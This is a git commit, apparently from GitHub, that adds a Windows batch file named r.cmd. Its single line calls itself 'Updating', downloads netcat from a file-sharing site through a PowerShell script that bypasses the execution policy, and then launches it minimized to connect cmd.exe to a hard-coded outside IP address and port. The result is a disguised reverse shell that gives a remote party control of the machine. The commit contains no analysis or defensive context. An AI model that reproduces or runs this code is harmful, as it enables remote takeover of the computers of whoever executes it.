2c0f7ee57095571f885dfa29b679b3d49508e0f6
puffin2 <30491308+puffin2@users.noreply.github.com>
2017-07-27 08:35:47 +0100

    Add files via upload

---
+++ r.cmd
@@ -0,0 +1,1 @@
+cmd /q /c "title Updating & mkdir /s & cd /s & echo (wget 'https://files.fm/down.php?i=ehbqh4uy^&n=nc.exe' -OutFile a.exe) > b.PS1 & powershell -ExecutionPolicy ByPass -File b.ps1 & START /MIN a.exe 80.2.9.175 5555 -e cmd.exe -d & exit"
